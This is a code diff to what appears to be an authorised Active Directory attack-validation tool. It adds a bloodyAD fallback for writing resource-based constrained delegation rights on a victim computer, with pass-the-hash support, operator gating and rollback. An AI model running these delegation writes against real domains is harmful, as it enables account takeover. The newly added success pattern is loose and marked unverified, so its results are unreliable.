@@ -30,12 +30,16 @@ from ..recommend import (ParamSpec, ParamValue, values, delegation_computer,
                          recommended_spn, validate_sam_name, sam_name_warning)
 from .. import proof
 from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
-                   redact_argv)
+                   redact_argv, ToolAttempt, first_successful)
 
 
 # ---- output predicate markers (verified against the recipe tooling, #66146) --
 _RE_ADDCOMPUTER_OK = re.compile(r"Successfully added (machine|computer) account", re.I)
 _RE_RBCD_WRITE_OK = re.compile(r"Delegation rights (modified|updated) successfully", re.I)
+# bloodyAD RBCD-write success marker (D2 light fallback). UNVERIFIED -- the exact
+# bloodyAD wording must be pinned in-lab; flagged like the probes' UNVERIFIED markers.
+_RE_BLOODYAD_RBCD_OK = re.compile(
+    r"can (now )?act on behalf|rbcd.*(written|added)|Successfully", re.I)
 _RE_RBCD_FLUSH_OK = re.compile(r"(Delegation rights flushed|rights (modified|updated) successfully)", re.I)
 # Positive marker that `-action read` actually returned the SD (not an empty/errored
 # read): the impacket-rbcd read output always carries this header on success.
@@ -133,6 +137,29 @@ class RBCDExecutor(ValidationExecutor):
             target += f":{cfg.password}"
         return target, extra
 
+    def _bloodyad_rbcd_argv(self, dc: str, vsam: str, new: str) -> list[str]:
+        """bloodyAD RBCD-write fallback when impacket-rbcd is absent/hung.
+
+        UNVERIFIED invocation (flag for lab-pinning):
+
+            bloodyAD -d <domain> -u <user> (-p <pass> | -H <hash>) --host <dc_ip>
+                add rbcd <victim$> <new$>
+
+        ``<victim$>`` is the delegate-to computer (whose
+        msDS-AllowedToActOnBehalfOfOtherIdentity is written); ``<new$>`` is the
+        controlled delegate-from computer. Secrets ride ``-p``/``-H`` so
+        :func:`redact_argv` masks them. aesKey-only auth is not wired for this
+        fallback (bloodyAD needs a ccache for -k); flagged for lab-pinning.
+        """
+        cfg = self.cfg
+        argv = ["bloodyAD", "-d", cfg.domain, "-u", cfg.username or ""]
+        if cfg.nt_hash:
+            argv += ["-H", cfg.nt_hash]
+        elif cfg.password is not None:
+            argv += ["-p", cfg.password]
+        argv += ["--host", dc, "add", "rbcd", f"{vsam}$", f"{new}$"]
+        return argv
+
     # ---------------------------------------------------------------- execute
     def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
         self.cfg = ctx.config
@@ -185,16 +212,24 @@ class RBCDExecutor(ValidationExecutor):
             return self._artifact(steps, gate, mutation, None, False, errors)
         mutation["applied"] = True
 
-        # 2) write RBCD on the victim (mutating, gated) ----------------------
+        # 2) write RBCD on the victim (mutating, gated; D2 light fallback) ---
+        # The GATE is called exactly as before, once, before either tool runs.
         if not gated("rbcd_write", {"delegate_to": f"{vsam}$", "delegate_from": f"{new}$"}):
             self._rollback(ctx, vsam, new, op_target, op_extra, mutation, steps, errors, record)
             return self._artifact(steps, gate, mutation, None, False, errors)
         rbcd_argv = ["impacket-rbcd", "-delegate-to", f"{vsam}$",
                      "-delegate-from", f"{new}$", "-action", "write",
                      "-dc-ip", dc, *op_extra, op_target]
-        res = ctx.runner.run(rbcd_argv, timeout=ctx.config.tool_timeout_s)
-        rbcd_ok = _RE_RBCD_WRITE_OK.search(res.stdout or "") is not None
-        record("rbcd_write", rbcd_argv, res, rbcd_ok)
+        attempts = [
+            ToolAttempt("impacket-rbcd", rbcd_argv,
+                        success=lambda r: bool(_RE_RBCD_WRITE_OK.search(r.stdout or ""))),
+            ToolAttempt("bloodyAD", self._bloodyad_rbcd_argv(dc, vsam, new),
+                        success=lambda r: bool(
+                            _RE_BLOODYAD_RBCD_OK.search((r.stdout or "") + (r.stderr or "")))),
+        ]
+        att, res, rbcd_ok = first_successful(attempts=attempts, runner=ctx.runner,
+                                             timeout=ctx.config.tool_timeout_s)
+        record("rbcd_write", att.argv, res, rbcd_ok, note=f"via {att.tool}")
         if not rbcd_ok:
             errors.append("rbcd_write_failed")
             self._rollback(ctx, vsam, new, op_target, op_extra, mutation, steps, errors, record)
